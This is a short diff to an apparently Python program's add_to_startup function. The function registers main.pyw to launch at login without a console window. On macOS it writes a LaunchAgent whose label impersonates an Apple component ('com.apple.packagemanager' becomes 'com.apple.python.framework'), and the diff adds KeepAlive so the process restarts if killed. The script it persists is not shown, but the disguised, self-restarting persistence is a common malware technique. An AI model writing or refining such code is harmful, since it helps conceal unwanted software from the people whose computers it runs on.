@@ -28,7 +28,7 @@ def is_admin():
 
 def add_to_startup():
     main_file_path = os.path.join(os.getcwd(), "main.pyw")
-    log_file_path = os.path.join(os.getcwd(), "logs", "logs.txt")
+    log_file_path = os.path.join(os.getcwd(), "logs", "log.txt")
     python_interpreter_path = sys.executable
     if python_interpreter_path.lower().endswith("python.exe"):
         python_interpreter_path = python_interpreter_path[:-10] + "pythonw.exe"
@@ -64,11 +64,12 @@ def add_to_startup():
                 "~/Library/LaunchAgents/com.apple.packagemanager.plist"
             )
         plist = dict(
-            Label="com.apple.packagemanager",
+            Label="com.apple.python.framework",
             ProgramArguments=[python_interpreter_path, main_file_path],
             RunAtLoad=True,
             StandardOutPath=log_file_path,
             StandardErrorPath=log_file_path,
+            KeepAlive=True,
         )
         with open(plist_path, "wb") as f:
             plistlib.dump(plist, f)
